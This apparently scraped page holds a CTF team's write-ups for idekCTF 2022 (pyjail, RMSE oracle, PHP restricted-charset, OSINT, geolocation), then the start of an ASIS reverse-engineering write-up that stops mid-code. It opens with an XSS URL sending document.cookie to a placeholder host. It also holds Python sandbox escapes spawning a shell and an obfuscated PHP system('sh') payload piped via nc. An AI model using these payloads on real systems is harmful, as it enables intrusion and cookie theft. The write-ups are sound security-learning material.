http://json-beautifier.chal.idek.team:1337/?json=%22%3Ciframe+srcdoc%3D%27%3Ctextarea+id%3Djson-input%3E%5B%26quot%3B%60%2B(location%3D%60https%3A%2F%2FXXXX%2F%60%2Bdocument.cookie)//%26quot%3B%5D%3C%2Ftextarea%3E%3Ciframe+name%3Dconfig+srcdoc%3D%26apos%3B%3Cframeset+id%3Ddebug%3E%3Cframeset+id%3Dopts+cols%3D%26quot%3B%60%26quot%3B%3E%26apos%3B%3E%3C%2Fiframe%3E%3Cscript+src%3Dstatic%2Fjs%2Fmain.js%3E%3C%2Fscript%3E%27%3E%22    Misc pyjail (22 solves) Solved by Hollow, LifeIsHard, TWY, J4cky; write-up by TWY\nThis challenge is a pyjail with the below forbidden characters and overrided global functions for eval:\nblocklist = [\u0026#39;.\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;,\u0026#39;:\u0026#39;] DISABLE_FUNCTIONS = [\u0026#34;getattr\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;breakpoint\u0026#34;, \u0026#34;lambda\u0026#34;, \u0026#34;help\u0026#34;] DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS} In the first version, we have infinite eval allowed. Allowing neither . nor getattr means that we cannot use the method provided. However we can still modify or delete the attributes by setattr and delattr\nOur target is to execute /readflag \u0026quot;giveflag\u0026quot; which prints out the flag.\nOur payload:\nsetattr(__import__(\u0026#39;__main__\u0026#39;),\u0026#39;blocklist\u0026#39;,list()) __import__(\u0026#39;os\u0026#39;).system(\u0026#39;/readflag giveflag\u0026#39;) which works by removing the blocklist in main, then executing the shell command.\nFor Pyjail Revenge, there is only 1 trial with 3 more entries in the blocklist (\u0026quot;blocklist\u0026quot;, \u0026quot;globals\u0026quot;, compile\u0026quot;) which does not have any effect as we can use string concatenation (like \u0026quot;glo\u0026quot; + \u0026quot;bals\u0026quot;) or abusing NFKD (like globᵃls) to bypass all use cases.\nWe did not dig much further on that during the competition.\nFlag: idek{9eece9b4de9380bc3a41777a8884c185}\nPost-mortem: We realized that DISABLE_FUNCTIONS is just a mask on the original builtins that we can delete to get back the original builtin functions.\nFlag for Pyjail Revenge:\nSample Payload:\nsetattr(license,\u0026#39;__dict__\u0026#39;,globᵃls()),delattr(license,\u0026#39;breakpoint\u0026#39;),breakpoint() (Pdb) import os; os.system(\u0026#34;bash\u0026#34;) $ /readflag giveflag idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!} idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}\nIntended Solution (by downgrade#0778):\n__import__(\u0026#39;antigravity\u0026#39;,setattr(__import__(\u0026#39;os\u0026#39;),\u0026#39;environ\u0026#39;,dict(BROWSER=\u0026#39;/bin/sh -c \u0026#34;/readflag giveflag\u0026#34; #%s\u0026#39;))) It works by overriding the shell code (and commenting out the url of the Easter Egg) used by the antigravity module to launch a browser (webbrowser module).\nManager Of The Year Series Solved by LifeIsHard, Mystiz\nPart 1 (14 solves) Challenge description\n Just another ML challenge\n In the source code, there are variables like X_train, y_train, X_test and y_test. We need to predict y_test and have a small enough RMSE. At first glance, it seems to be a Machine Learning challenge.\nData explanation\n X_train and X_test are independent features  temperature fuel_price cpi unemployment net_cost_price_in_thousands average_user_points average_critic_points average_items_sold_in_thousands   y_train and y_test are dependent variables, which is our target  revenue_in_thousands    However, we can notice some unusual parts from the source code.\n We can only get flag if our prediction can meet rmse \u0026lt; 1e-8, the threshold is unreasonably low and could hardly be achieved by ML. We got a lot of request limit (i.e. chances to test our prediction). We can send our predictions for at most 367 times, and we can know the RMSE value for our predictions.  Note: the request limit is written as n_days = 365 n_reqs_lim = n_days + 2    RMSE formula\n$$\\text{RMSE}=\\sqrt{\\frac{ \\sum_{i=1}^{N} (Predicted_i-Actual_i)^2}{N}}$$\nAssuming, if we only change our prediction for $i=1$ and keep our prediction for $i=2\\ \\text{to}\\ 365$ the same. We can get the two equations:\n$$ \\begin{aligned} {\\color{#91f2f1}{\\text{RMSE}'}}=\\sqrt{\\frac{({\\color{#91f2f1}{\\hat{y}'_0}}-y_0)^2+(\\hat{y}_1-y_1)^2+\u0026hellip;+(\\hat{y}_{365}-y_{365})^2}{N}} \\\\ {\\color{#91f2f1}{\\text{RMSE}''}}=\\sqrt{\\frac{({\\color{#91f2f1}{\\hat{y}''_0}}-y_0)^2+(\\hat{y}_1-y_1)^2+\u0026hellip;+(\\hat{y}_{365}-y_{365})^2}{N}} \\end{aligned} $$\nOnly the blueparts are different. By rearranging and subtracting one equation from the other, we can get the value of $y_0$ (i.e. the value that we need to \u0026ldquo;predict\u0026rdquo;).\n$$y_0=\\frac{(\\text{RMSE}'')^2N-(\\text{RMSE}')^2N-{\\hat{y}''_0}^2+{\\hat{y}'_0}^2}{2(\\hat{y}'_0-\\hat{y}''_0)}$$\nTo make it simpler, we can set\n first prediction: $\\hat{y}'_0=0$ second prediction: $\\hat{y}''_0=100$  $$y_0=\\frac{(\\text{RMSE}'')^2N-(\\text{RMSE}')^2N-{100}^2}{-200}$$\nWe can do the same for each data point. Then we can get the exact y_test value. We need $365+1$ requests to get the value for $365$ $y$-value, then use the last $1$ request to submit the correct values. This matches the request limit of n_reqs_lim = n_days + 2.\nNote: As the RMSE we get is not an exact value, we can make our \u0026ldquo;prediction\u0026rdquo; more precise by rounding the calculated value to 2 decimal places.\nSolve script idek2022_manager1_solve.py\nFlag: idek{595a8beb7d381e7f3a8b2d4c88fe8b9b}\nPart 2 (10 solves) Challenge description\n Yet another ML challenge\n The source code is pretty similar to Part 1.\nComparison\n    Part 1 Part 2     Check for data quality N/A test_data.min() \u0026gt;= 0test_data.max() \u0026lt;= 100   Requirement rmse \u0026lt; 1e-8 rmse \u0026lt; 0.07   Request limit 367 7000   Message Value of rmse is given Only know if mse \u0026gt; prev_mse    As the value of RMSE is not given, we cannot use the method in Part 1. However, the threshold is loosened and we can send more requests.\nIt is likely that this is NOT a ML challenge because the high request limit (7000). As we can have some information about the RMSE (higher or lower than the previous one), we can make some guesses and narrow the range of the correct value.\nWe only need the range to be \u0026lt; 0.14, then we can take the middle value and be sure that the error for that $y_i$ is \u0026lt; 0.07.\nMethod 1\n Use 2 attempts for a 50% range cut Takes 20 attempts for each data point (to make sure range \u0026lt; 0.14) Illustration  Correct value = 41.32 For row 1, rmse2 \u0026gt; rmse1, value is closer to 0 (lower bound)  change upper bound, range becomes [0,50]   For row 2, rmse2 \u0026lt;= rmse1, value is closer to 50 (upper bound)  change lower bound, range becomes [25,50]   etc.        Bounds Range Request1 Request2     1 [0,100] 100 0 100   2 [0,50] 50 0 50   3 [25,50] 25 25 50   4 [37.5,50] 12.5 37.5 50   5 [37.5,43.75] 6.25 37.5 43.75   6 [40.625, 43.75] 3.125 40.625 43.75   7 [40.625, 42.1875] 1.5625 40.625 42.1875   8 [40.625, 41.40625] 0.78125 40.625 41.40625   9 [41.015625, 41.40625] 0.390625 41.015625 41.40625   10 [41.2109375, 41.40625] 0.1953125 41.2109375 41.40625   11 [41.30859375, 41.40625] 0.09765625 / /    Method 2\n We can save some attempts if either the lower/upper bound = previous request value Takes 11-20 attempts for each data point (to make sure range \u0026lt; 0.14)  Depends on luck (where the number locate)   Illustration  Correct value = 41.32 For row 3, the previous request value is \u0026ldquo;50\u0026rdquo;, we can just request \u0026ldquo;25\u0026rdquo; and we will know whether \u0026ldquo;25\u0026rdquo; or \u0026ldquo;50\u0026rdquo; is closer to the correct value For row 6, the previous request value is \u0026ldquo;43.75\u0026rdquo; For row 7, the previous request value is \u0026ldquo;40.625\u0026rdquo; etc. In this case, we only need 16 attempts        Bounds Range Request1 Request2     1 [0,100] 100 0 100   2 [0,50] 50 0 50   3 [25,50] 25 25 -   4 [37.5,50] 12.5 37.5 50   5 [37.5,43.75] 6.25 37.5 43.75   6 [40.625, 43.75] 3.125 40.625 -   7 [40.625, 42.1875] 1.5625 - 42.1875   8 [40.625, 41.40625] 0.78125 40.625 41.40625   9 [41.015625, 41.40625] 0.390625 41.015625 -   10 [41.2109375, 41.40625] 0.1953125 41.2109375 41.40625   11 [41.30859375, 41.40625] 0.09765625 / /    Solve script idek2022_manager2_solve.py\nIn the above solve script, used Method 2. (Ran the code for 4 times, on average using 5616 requests to get the flag.)\nFlag: idek{25d3cc2f403ca5177f928b42af494050}\nFurther enhancement\n Change the range threshold (still 100% solve)  We require the range to be \u0026lt; 0.14 in the above solution However, the actual range when satisfying this situation will always be $100/2^{10}=0.09765625$ It means that we can set the threshold to be larger for some data points Let $x$ be the number of threshold $= 0.09765625$, then $$0.09765625x+0.1953125(365-x)\u0026lt;0.14(365) \\Rightarrow x\u0026gt;206.736$$ We can set threshold $= 0.09765625$ for $207$ data points, and $0.1953125$ for $158$ data points (or $0.14$ and $0.28$, which will get the same result) Changes in code threshold = 0.14 if i \u0026lt; 207 else 0.28 while bounds[1]-bounds[0] \u0026gt; threshold: ...  Result  Ran the code for 4 times, on average using 5353 requests to get the flag Can save ~260 requests     Use even larger range threshold (not 100% can solve)  We are using a \u0026ldquo;safe\u0026rdquo; threshold to make sure EVERY data point to have error \u0026lt; 0.07 In fact, the error won\u0026rsquo;t be exactly at the threshold for every data point For some data points, we will be luckier and have smaller error Then we can allow a larger room for error for the other data points (i.e. we can use even higher threshold in general) However, there will be a trade off between success rate and fewer requests    Niki (11 solves) Solved by fsharp, RaccoonNinja, TWY; write-up by RaccoonNinja\nA guessing misc challenge.\nThe manual was in German so I used an online service to translate it. After some trial-and-error with the procedures:\nWe assumed with high confidence:\n Only the letter-named functions are changed (change a few important letters) All letters will be placed on the board (i.e. the flag can be read directly) and do not overlap The main procedure\u0026rsquo;s lines but not their inner content are scrambled (the first line definitely won\u0026rsquo;t work)  There are only tiek()dspo left, as zero is not used in main.\nWe did solve the puzzle with very aggressive guessing, but apparently there were multiple solutions.\nBruteforcing all the possible anagrams (6) was also a viable option.\nPHPFu\u0026hellip;n (10 solves) Solved by ozetta, TWY; write-up by TWY\nIn this challenge, we are only allowed to use [(,.^')] characters to execute arbitary PHP code.\nDue to the nature that the server reads the payload via /bin/bash, the length limit is thus restricted to 4096.\nGiven that we have ' characters to form strings, we can make use of PHP operator ^ (xor) on strings to obtain more characters to build the payload.\nBy checking the ASCII values of the given characters (All within the range of [0x28, 0x2f] ∪ [0x58, 0x5f] with all lower bits available), it indicates that we can only produce characters in the range of [0x00, 0x07] ∪ [0x28, 0x2f] ∪ [0x58, 0x5f] ∪ [0x70, 0x77].\nThere is another trick in PHP that we can use the syntax \u0026quot;func_name\u0026quot;(a, b) to evaluate funcname(a, b), which means we can call functions if the function name can be built using the provided characters.\nRunning a simple check against get_defined_functions()[\u0026quot;internal\u0026quot;] reveals that there are only 3 function names satisfying the criteria: sqrt, strstr, and strtr.\nNotice that sqrt requires an integer (or a string comprising only digits), strtr takes strings and outputs only a string with the characters already in the arguments (producing no new characters). Since we do not have usable digit at this point, we can only rely on the remaining function, strstr. strstr can accept two strings as argument, and return a string if the 2nd argument is a substring of the 1st argument or false if not.\nHaving false as return type means we can get a number 0 at this point by false ^ false = 0.\nHere is the note on generating the character 0:\n# strings in double quote means they are generated are should be replaced by the corresponding code \u0026#34;s\u0026#34;: \u0026#39;[\u0026#39;^\u0026#39;(\u0026#39; \u0026#34;t\u0026#34;: \u0026#39;)\u0026#39;^\u0026#39;]\u0026#39; \u0026#34;r\u0026#34;: \u0026#39;,\u0026#39;^\u0026#39;^\u0026#39; \u0026#34;strstr\u0026#34;: (\u0026#34;s\u0026#34;).(\u0026#34;t\u0026#34;).(\u0026#34;r\u0026#34;).(\u0026#34;s\u0026#34;).(\u0026#34;t\u0026#34;).(\u0026#34;r\u0026#34;) false: (\u0026#34;strstr\u0026#34;)(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;) 0: false^false \u0026#34;0\u0026#34;: (0).\u0026#39;\u0026#39; As the ascii value of \u0026lsquo;0\u0026rsquo; is 0x30, which means now 64 characters can be generated:\n[0x00, 0x07] ∪ [0x18, 0x1f] ∪ [0x28, 0x37] ∪ [0x40, 0x47] ∪ [0x58, 0x5f] ∪ [0x68, 0x77]\nThis includes digits from 0 to 7 and all letters (case insensitive) can be generated. Noticeably, letters h to w is in lower case and all others are in upper case. Importantly, s and h are both in lower case.\nAt this point, we can already get the shell:\n\u0026#34;Y\u0026#34;: \u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39; \u0026#34;E\u0026#34;: \u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#34;0\u0026#34; \u0026#34;h\u0026#34;: \u0026#39;(\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;^\u0026#34;0\u0026#34; \u0026#34;m\u0026#34;: \u0026#39;]\u0026#39;^\u0026#34;0\u0026#34; \u0026#34;sYstEm\u0026#34;: (\u0026#34;s\u0026#34;).(\u0026#34;Y\u0026#34;).(\u0026#34;s\u0026#34;).(\u0026#34;t\u0026#34;).(\u0026#34;E\u0026#34;).(\u0026#34;m\u0026#34;) \u0026#34;sh\u0026#34;: (\u0026#34;s\u0026#34;).(\u0026#34;h\u0026#34;) Get shell: (\u0026#34;sYstEm\u0026#34;)(\u0026#34;sh\u0026#34;) # Payload Length: 521 (echo \u0026#34;((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)).\u0026#39;\u0026#39;).(\u0026#39;]\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)).\u0026#39;\u0026#39;))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)).\u0026#39;\u0026#39;))\u0026#34; \u0026amp;\u0026amp; cat) | nc phpfun.chal.idek.team 1337 Input script: bash # switch to bash shell if needed $ cat /flag.txt idek{N3w_v3rs1on_r3qu1re_new_t00lz!} Extras:\nWe only have half of the standard ascii characters available. How about a short payload to create the remaining characters?\n(This is equivalent to creating just 1 more character not currently available)\n\u0026#34;q\u0026#34;: \u0026#39;,\u0026#39;^\u0026#39;]\u0026#39; \u0026#34;6\u0026#34;: \u0026#39;(\u0026#39;^\u0026#39;.\u0026#39;^\u0026#34;0\u0026#34; \u0026#34;4\u0026#34;: \u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#34;0\u0026#34; \u0026#34;sqrt\u0026#34;: (\u0026#34;s\u0026#34;).(\u0026#34;q\u0026#34;).(\u0026#34;r\u0026#34;).(\u0026#34;t\u0026#34;) \u0026#34;64\u0026#34;: (\u0026#34;6\u0026#34;).(\u0026#34;4\u0026#34;) 8: (\u0026#34;sqrt\u0026#34;)(\u0026#34;64\u0026#34;) \u0026#34;8\u0026#34;: (8).\u0026#39;\u0026#39; Post-mortem: There is a shorter payload for 0, which is illustrated by the following:\n# original, length: 139 0: false^false ((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;) # replacement, length: 112 # notice that this is a float 0 instead of an integer 0 0: (\u0026#34;sqrt\u0026#34;)(false) ((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;)) # Shortened Shell Payload - Length: 440 ((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;))).\u0026#39;\u0026#39;).(\u0026#39;]\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;))).\u0026#39;\u0026#39;))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;^(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;^\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;,\u0026#39;))).\u0026#39;\u0026#39;))   By these, we can generate all available characters.\nOsint Osint Crime Confusion Series Solved by fsharp, Hollow, J4cky, LifeIsHard, RaccoonNinja, TWY\n1: W as in Where (74 solves) We found Dr. Jonathan Abigdail III in IG (a clue is that Abigdail is very uncommon name)\nWe check the post and found another user - Heather James from hashtag\nWe know some information about Heather James\n study and Teached blue birds at the University of Dutch ThE of Topics in Science (UThE_TS) great_paintball_portugal competition ebay\n We found a user named great_paintball_portugal in ebay and a url: https://franparrefrancisco.wixsite.com/great-paintball-pt\nThen, we check the post at https://franparrefrancisco.wixsite.com/great-paintball-pt/blog\nFlag: idek{TGPP_WCIYD}\n2: W as in Weapon (50 solves) It has something to do with a university of science. We checked the university\u0026rsquo;s twitter (blue bird) and found this\nThen, we visit https://pads.ccc.de/ep/pad/view/ro.lvGC01KAJWI/rev.354\n We do have a theory to what killed because something has been missing ( HUBBLE SPACE TELESCOPE MODEL, BY PENWAL INDUSTRIES FOR NASA, CA 1990) ah shit delete delete\n Flag: idek{HSTM_X!#$}\n3: W as in Who (76 solves) First, I found a name Alfaiate D\u0026rsquo;interiores from the attached picture\nAfter google the name, you can see the store\u0026rsquo;s comments\nFound the email address: noodlesareramhackers@gmail.com\nI send an email and here is the reply.\n So\u0026hellip; I got some stuff to tell you. I think the killer is probably watching us. The killer used a weird weapon as you have found out. Look, the info I have is that weirdly enough the university page of Heather tweeted something that might lead you to the killer. They deleted it though. Luckily these days you can just walk back in time! Ah, the tweet was 1612383535549059076. When you have the info look in github! Good Luck!\n So, check the deleted tweet at https://web.archive.org/web/20230109094239/https://twitter.com/UThE_TS/status/1612383535549059076/\n Remember that weird student that wrote about potatoes eating camels? AHAHAH Maybe she is the killer\n We have some info now, so take a look at github and found the flag https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki Flag: idek{JULIANA_APOSIDM723489}\n4: W as in Why (74 solves) Use the keywords Johan Jørgen and sommerleker to google search. Then i find this.\nIt is the same as the picture attached. So, the flag is idek{OLM-08741}\nNMPZ (54 solves) Solved by most members of the team collaborating; write-up by RaccoonNinja\nUsual clues in Geolocation:\n Landmarks (confirmed by image search or otherwise)     # Letter Country Reason     1 B Brazil Mureta da Urca   2 R Russia Kremlin+Saint Basil\u0026rsquo;s Cathedral   6 _ Iceland Ring Road crossref   9 _ Monaco Monaco Cruise Port     Legible text and less legible text     # Letter Country Reason     3 e estonia Kalamaja   5 K Kenya \u0026ldquo;Peri Peri Pizza\u0026rdquo;, \u0026ldquo;Third Street\u0026rdquo;   12 a Austria \u0026ldquo;Elektro weißensteiser\u0026rdquo;, \u0026ldquo;Nikolaus-Dumba-Straße\u0026rdquo;   14 ??? Certain Spanish country \u0026ldquo;Vía\u0026rdquo; means road in Spanish   15 b Bulgaria \u0026ldquo;за\u0026hellip;\u0026rdquo; ИМД (actually КМД), Google image search     Other characteristics (often need cross-check)     # Letter Country Reason     4 A Australia General outback   7 m Mongolia Yurt (cross-checked by image search)   10 s Switzerland Flag (from a problem-setting perspective), overall household style and road mirror   11 P Poland Road pole (google image search)    Now it is a guessing game, but there are plenty of ways to narrow the search.\n There are only \u0026lt;150 countries with population \u0026gt;= 1mil, all other countries are word boundaries Always look at the flag BRe*K_m*_sPa**B**.  4 is most likely A/a, with the general outback feel and the road characteristics =\u0026gt; Australia 8 is e/E/Y but Yemen is unlikely =\u0026gt; e/E, this is the only character I guessed at submission (post solve: it\u0026rsquo;s Eswatini) 13 is America or Canada from image search (road characteristics) but sPaA doesn\u0026rsquo;t make sense 16, 17 are image-searched as albania and Russia respectively, but they just confirm my guess of sPaCEbaR, with Ecuador fitting 14.   Geohints can be useful but I didn\u0026rsquo;t use it. The discord channel discussion has lots of useful info (after the CTF) as well  ","permalink":"https://b6a.black/posts/2023-02-03-idekctf/","summary":"Our collection of writeups for idekCTF 2022*.","title":"idekCTF 2022* Writeup"},{"content":"Rexy (Reverse, 53 solves) Solved by fsharp\nA Linux program and an encrypted flag are provided. Opening the program in Ghidra, we find that it reads the plaintext flag from a file before passing it into an encryption function that involves randomness from rand(), buffers that get allocated only to be freed up without being used, and base conversions.\nLooking closer, some parts of this function are actually redundant and only exist to confuse us. The actual encryption algorithm is quite simple and can be written as:\ndef encrypt(pt): ct = \u0026#34;\u0026#34; pos = 0 for c in pt: pos += 1 pos_squared = (pos ** 2) ^ 0x19 xord_c = ord(c) ^ pos_squared ^ 0x69b2 ^ 0x11f0b8 based_c = format(int(format(xord_c, \u0026#39;o\u0026#39;)), \u0026#39;X\u0026#39;) ct += based_c ct = ct[::-1] + \u0026#34;5ADB\u0026#34; return ct We write the decryption algorithm and get the flag:\ndef decrypt(ct): pt = \u0026#34;\u0026#34; pos = 0 ct = ct.rstrip(\u0026#34;5ADB\u0026#34;)[::-1] for i in range(0, len(ct), 6): pos += 1 pos_squared = (pos ** 2) ^ 0x19 based_c = ct[i : i + 6] xord_c = int(str(int(based_c, 16)), 8) c = chr(xord_c ^ pos_squared ^ 0x69b2 ^ 0x11f0b8) pt += c return pt encrypted = open(\u0026#34;flag.enc\u0026#34;).read().strip() flag = decrypt(encrypted) print(flag) The plaintext is:\nCongratulation! You got the flag: +ASIS{W00twootW00t_HappyNewYear}+ Have fun and good luck new year!! Deserve (Reverse, 32 solves) Solved by harrier, grhkm\nWe are given an ARM binary that takes input from stdin and outputs an encoded message. By disassembling the binary, we see that the main function is located at 0xBE0. We decided to perform static analysis first, which in hindsight is not the best idea, but we will see why later.\nThe code can be splitted into two parts.\n__int64 __fastcall sub_BE0(_BYTE *a1, unsigned __int64 *input_len) { // ... input = a1; v3 = *input_len; v5 = malloc(4 * input_len); if ( !v5 ) sub_F60(\u0026quot;malloc\u0026quot;); if ( v3 ) { v6 = 0LL; i = 0LL; b_loc_table = (__int64 *)__ctype_b_loc(); v9 = 0; do { cur_char = (unsigned __int8)input[i]; v3 = v6; v11 = *b_loc_table; // Check 1 if ( (*b_loc_table + 2LL * cur_char) \u0026amp; 8 ) { ++v9; *(_BYTE *)(v5 + v6) = cur_char; v6 = v9; v3 = v9; } // Check 2 else if ( cur_char == 32 ) { if ( v9 \u0026gt; 1 \u0026amp;\u0026amp; (v11 + 2LL * *(unsigned __int8 *)(v5 + v6 - 1)) \u0026amp; 0x200 \u0026amp;\u0026amp; (v5 + v6 - 2) == '+' ) { v39 = *(unsigned __int8 *)(v5 + v6 - 1); *(_BYTE *)(v5 + v6 - 1) = *(_DWORD *)(*(_QWORD *)__ctype_toupper_loc() + 4 * v39); } else { ++v9; *(_BYTE *)(v5 + v6) = '/'; v6 = v9; v3 = v9; } } else { if ( !input[i] ) goto LABEL_9; // Check 3 v33 = strchr(\u0026quot;@$_!\\\u0026quot;#%\u0026amp;'()*+,-./:;\u0026lt;=\u0026gt;?\\n\u0026quot;, (unsigned __int8)input[i]); if ( v33 ) { v34 = v9 + 1; v9 += 2; *(_BYTE *)(v5 + v6) = '+'; v6 = v9; v3 = v9; *(_BYTE *)(v5 + v34) = v33 - (unsigned __int64)\u0026quot;@$_!\\\u0026quot;#%\u0026amp;'()*+,-./:;\u0026lt;=\u0026gt;?\\n\u0026quot; + 